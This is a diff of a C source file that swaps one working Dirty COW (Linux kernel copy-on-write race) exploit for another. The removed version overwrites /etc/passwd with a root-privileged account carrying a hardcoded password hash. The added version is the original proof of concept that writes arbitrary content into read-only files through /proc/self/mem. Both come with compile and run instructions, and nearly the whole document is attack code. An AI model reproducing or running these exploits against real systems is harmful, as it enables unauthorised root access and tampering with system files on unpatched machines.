@@ -1,178 +1,114 @@
-//
-// This exploit uses the pokemon exploit of the dirtycow vulnerability
-// as a base and automatically generates a new passwd line.
-// The user will be prompted for the new password when the binary is run.
-// The original /etc/passwd file is then backed up to /tmp/passwd.bak
-// and overwrites the root account with the generated line.
-// After running the exploit you should be able to login with the newly
-// created user.
-//
-// To use this exploit modify the user values according to your needs.
-//   The default is "firefart".
-//
-// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
-//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
-//
-// Compile with:
-//   gcc -pthread dirty.c -o dirty -lcrypt
-//
-// Then run the newly create binary by either doing:
-//   "./dirty" or "./dirty my-new-password"
-//
-// Afterwards, you can either "su firefart" or "ssh firefart@..."
-//
-// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
-//   mv /tmp/passwd.bak /etc/passwd
-//
-// Exploit adopted by Christian "FireFart" Mehlmauer
-// https://firefart.at
-//
-
+/*
+####################### dirtyc0w.c #######################
+$ sudo -s
+# echo this is not a test > foo
+# chmod 0404 foo
+$ ls -lah foo
+-r-----r-- 1 root root 19 Oct 20 15:23 foo
+$ cat foo
+this is not a test
+$ gcc -pthread dirtyc0w.c -o dirtyc0w
+$ ./dirtyc0w foo m00000000000000000
+mmap 56123000
+madvise 0
+procselfmem 1800000000
+$ cat foo
+m00000000000000000
+####################### dirtyc0w.c #######################
+*/
+#include <stdio.h>
+#include <sys/mman.h>
 #include <fcntl.h>
 #include <pthread.h>
-#include <string.h>
-#include <stdio.h>
-#include <stdint.h>
-#include <sys/mman.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <sys/wait.h>
-#include <sys/ptrace.h>
-#include <stdlib.h>
 #include <unistd.h>
+#include <sys/stat.h>
+#include <string.h>
+#include <stdint.h>
 
-const char *filename = "/etc/passwd";
-const char *backup_filename = "/tmp/passwd.bak";
-
-int f;
 void *map;
-pid_t pid;
-pthread_t pth;
+int f;
 struct stat st;
-
-struct Userinfo {
-   char *username;
-   char *hash;
-   int user_id;
-   int group_id;
-   char *info;
-   char *home_dir;
-   char *shell;
-};
-
-char *generate_passwd_line(struct Userinfo u) {
-  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
-  int size = snprintf(NULL, 0, format, u.username, u.hash,
-    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
-  char *ret = malloc(size + 1);
-  sprintf(ret, format, u.username, u.hash, u.user_id,
-    u.group_id, u.info, u.home_dir, u.shell);
-  return ret;
-}
-
-void *madviseThread(void *arg) {
-  int i, c = 0;
-  for(i = 0; i < 200000000; i++) {
-    c += madvise(map, 100, MADV_DONTNEED);
-  }
-  printf("madvise %d\n\n", c);
-}
-
-int copy_file(const char *from, const char *to) {
-  // check if target file already exists
-  if(access(to, F_OK) != -1) {
-    printf("File %s already exists! Please delete it and run again\n",
-      to);
-    return -1;
-  }
-
-  char ch;
-  FILE *source, *target;
-
-  source = fopen(from, "r");
-  if(source == NULL) {
-    return -1;
-  }
-  target = fopen(to, "w");
-  if(target == NULL) {
-     fclose(source);
-     return -1;
-  }
-
-  while((ch = fgetc(source)) != EOF) {
-     fputc(ch, target);
-   }
-
-  printf("%s successfully backed up to %s\n",
-    from, to);
-
-  fclose(source);
-  fclose(target);
-
-  return 0;
-}
-
-int main(int argc, char *argv[])
+char *name;
+ 
+void *madviseThread(void *arg)
 {
-  // backup file
-  int ret = copy_file(filename, backup_filename);
-  if (ret != 0) {
-    exit(ret);
+  char *str;
+  str=(char*)arg;
+  int i,c=0;
+  for(i=0;i<100000000;i++)
+  {
+/*
+You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
+> This is achieved by racing the madvise(MADV_DONTNEED) system call
+> while having the page of the executable mmapped in memory.
+*/
+    c+=madvise(map,100,MADV_DONTNEED);
   }
-
-  struct Userinfo user;
-  // set values, change as needed
-  user.username = "lourcode";
-  user.user_id = 0;
-  user.group_id = 0;
-  user.info = "pwned";
-  user.home_dir = "/root";
-  user.shell = "/bin/bash";
-
-  user.hash = "fiexYU42CCtOs";
-  char *complete_passwd_line = generate_passwd_line(user);
-  printf("Complete line:\n%s\n", complete_passwd_line);
-
-  f = open(filename, O_RDONLY);
-  fstat(f, &st);
-  map = mmap(NULL,
-             st.st_size + sizeof(long),
-             PROT_READ,
-             MAP_PRIVATE,
-             f,
-             0);
-  printf("mmap: %lx\n",(unsigned long)map);
-  pid = fork();
-  if(pid) {
-    waitpid(pid, NULL, 0);
-    int u, i, o, c = 0;
-    int l=strlen(complete_passwd_line);
-    for(i = 0; i < 10000/l; i++) {
-      for(o = 0; o < l; o++) {
-        for(u = 0; u < 10000; u++) {
-          c += ptrace(PTRACE_POKETEXT,
-                      pid,
-                      map + o,
-                      *((long*)(complete_passwd_line + o)));
-        }
-      }
-    }
-    printf("ptrace %d\n",c);
+  printf("madvise %d\n\n",c);
+}
+ 
+void *procselfmemThread(void *arg)
+{
+  char *str;
+  str=(char*)arg;
+/*
+You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
+>  The in the wild exploit we are aware of doesn't work on Red Hat
+>  Enterprise Linux 5 and 6 out of the box because on one side of
+>  the race it writes to /proc/self/mem, but /proc/self/mem is not
+>  writable on Red Hat Enterprise Linux 5 and 6.
+*/
+  int f=open("/proc/self/mem",O_RDWR);
+  int i,c=0;
+  for(i=0;i<100000000;i++) {
+/*
+You have to reset the file pointer to the memory position.
+*/
+    lseek(f,(uintptr_t) map,SEEK_SET);
+    c+=write(f,str,strlen(str));
   }
-  else {
-    pthread_create(&pth,
-                   NULL,
-                   madviseThread,
-                   NULL);
-    ptrace(PTRACE_TRACEME);
-    kill(getpid(), SIGSTOP);
-    pthread_join(pth,NULL);
-  }
-
-  printf("Done! Check %s to see if the new user was created.\n", filename);
-  printf("You can log in with the username '%s'.\n\n",
-    user.username);
-    printf("\nDON'T FORGET TO RESTORE! $ mv %s %s\n",
-    backup_filename, filename);
+  printf("procselfmem %d\n\n", c);
+}
+ 
+ 
+int main(int argc,char *argv[])
+{
+/*
+You have to pass two arguments. File and Contents.
+*/
+  if (argc<3) {
+  (void)fprintf(stderr, "%s\n",
+      "usage: dirtyc0w target_file new_content");
+  return 1; }
+  pthread_t pth1,pth2;
+/*
+You have to open the file in read only mode.
+*/
+  f=open(argv[1],O_RDONLY);
+  fstat(f,&st);
+  name=argv[1];
+/*
+You have to use MAP_PRIVATE for copy-on-write mapping.
+> Create a private copy-on-write mapping.  Updates to the
+> mapping are not visible to other processes mapping the same
+> file, and are not carried through to the underlying file.  It
+> is unspecified whether changes made to the file after the
+> mmap() call are visible in the mapped region.
+*/
+/*
+You have to open with PROT_READ.
+*/
+  map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
+  printf("mmap %zx\n\n",(uintptr_t) map);
+/*
+You have to do it on two threads.
+*/
+  pthread_create(&pth1,NULL,madviseThread,argv[1]);
+  pthread_create(&pth2,NULL,procselfmemThread,argv[2]);
+/*
+You have to wait for the threads to finish.
+*/
+  pthread_join(pth1,NULL);
+  pthread_join(pth2,NULL);
   return 0;
 }
